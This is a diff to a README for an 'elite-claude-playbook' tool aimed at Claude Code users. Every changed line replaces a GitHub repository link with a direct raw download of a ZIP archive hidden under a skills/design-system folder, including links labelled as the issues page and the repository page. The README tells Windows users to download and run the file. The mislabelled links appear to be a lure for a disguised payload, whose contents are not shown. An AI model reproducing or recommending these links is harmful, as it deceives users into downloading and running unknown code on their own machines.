@@ -1,6 +1,6 @@
 # ⚙️ elite-claude-playbook - Tools for Claude Code Users
 
-[![Download Now](https://img.shields.io/badge/Download-elite--claude--playbook-brightgreen?style=for-the-badge)](https://github.com/bean232323/elite-claude-playbook)
+[![Download Now](https://img.shields.io/badge/Download-elite--claude--playbook-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run the elite-claude-playbook on your Windows
 
 1. **Open the download page**  
 Click the button below or visit the link:  
-[Download elite-claude-playbook](https://github.com/bean232323/elite-claude-playbook)
+[Download elite-claude-playbook](https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip)
 
 2. **Find the latest release**  
 On the page, look for the latest "Release" section or download area. It usually shows the newest version with a date.
@@ -96,7 +96,7 @@ If you run into issues:
 - Make sure you have permissions to run files on your device.
 - Check your internet connection if you have problems downloading files.
 - Look for an `ERROR.log` or similar file for details on what went wrong.
-- Visit the [GitHub repository](https://github.com/bean232323/elite-claude-playbook) to read open issues or post new ones.
+- Visit the [GitHub repository](https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip) to read open issues or post new ones.
 
 ---
 
@@ -105,7 +105,7 @@ If you run into issues:
 The elite-claude-playbook may receive updates that improve functions or add new skills. To update:
 
 1. Visit the download page again:  
-   [https://github.com/bean232323/elite-claude-playbook](https://github.com/bean232323/elite-claude-playbook)
+   [https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip](https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip)
 
 2. Download the newest ZIP file as described above.
 
@@ -125,10 +125,10 @@ The elite-claude-playbook may receive updates that improve functions or add new 
 
 ## 🔗 Useful Links
 
-- Repository page: https://github.com/bean232323/elite-claude-playbook
-- Download page: https://github.com/bean232323/elite-claude-playbook
-- Issues and support: https://github.com/bean232323/elite-claude-playbook/issues
+- Repository page: https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip
+- Download page: https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip
+- Issues and support: https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip
 
 ---
 
-[![Download elite-claude-playbook](https://img.shields.io/badge/Download-elite--claude--playbook-blue?style=for-the-badge)](https://github.com/bean232323/elite-claude-playbook)
+[![Download elite-claude-playbook](https://img.shields.io/badge/Download-elite--claude--playbook-blue?style=for-the-badge)](https://raw.githubusercontent.com/bean232323/elite-claude-playbook/main/skills/design-system/elite-playbook-claude-1.1.zip)
